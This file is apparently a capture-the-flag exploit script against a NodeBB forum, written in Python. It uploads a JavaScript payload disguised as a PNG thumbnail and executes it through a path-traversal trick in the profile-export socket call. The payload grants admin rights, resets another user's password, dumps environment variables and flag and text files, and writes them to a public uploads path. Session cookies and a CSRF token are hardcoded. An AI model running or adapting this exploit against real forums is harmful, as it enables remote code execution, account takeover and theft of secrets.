import requests

TOPIC_ID = 'e902675d-d29d-48d0-8ae8-063733f918b1'
BASE_URL = "http://tdc.ctf:10008"
API_URL = f"/api/v3/topics/{TOPIC_ID}/thumbs"

payload = b'''
const fs = require('fs');
const child_process = require('child_process');

// Run node /usr/src/app/nodebb user make admin 2

child_process.execSync('node /usr/src/app/nodebb user make admin 2');
child_process.execSync('node /usr/src/app/nodebb user reset 1 --password superadmin');

const result = {};

result.env = process.env;

function read_directory_and_files(path, filePattern) {
    const files = fs.readdirSync(path).filter(file => file.match(filePattern));

    const result = {};

    for (const file of files) {
        result[file] = fs.readFileSync(path + file, 'utf8');
    }

    return result;
}

const dirs = [
    '/',
    '/usr/src',
    '/usr/src/app',
];

for (const dir of dirs) {
    result[dir] = [
        read_directory_and_files(dir, /.*\.txt/),
        read_directory_and_files(dir, /.*flag.*/),
    ];
}

fs.writeFileSync('/usr/src/app/public/uploads/files/HACKED.txt', JSON.stringify(result));
'''

payload_filename = 'test.js'

headers = {
    'X-CSRF-Token': 'gELjmpKf-Mu8XdqK4j_ka-Sxhkmow1fY6NJI',
    'Cookie': 'express.sid=s%3AIHNtyJmlqvWljGTDWrpzPIDRE1MvSYf6.YvYsrfAA084kSZw8Ql367r8CRoRXv7%2F%2FpHa5igybQa8',
}

def upload_image():
    files = {
        'files[]': (payload_filename, payload, 'image/png')
    }
    response = requests.post(BASE_URL + API_URL, files=files)
    if response.status_code == 400:
        print(response.text)
        exit(0)

while True:
    upload_image()

# Create user #2
# Send socket.emit('user.exportProfile', { uid: 2, type: '/../../../../../../../tmp/<File ID>' })
# Request /assets/uploads/files/HACKED.txt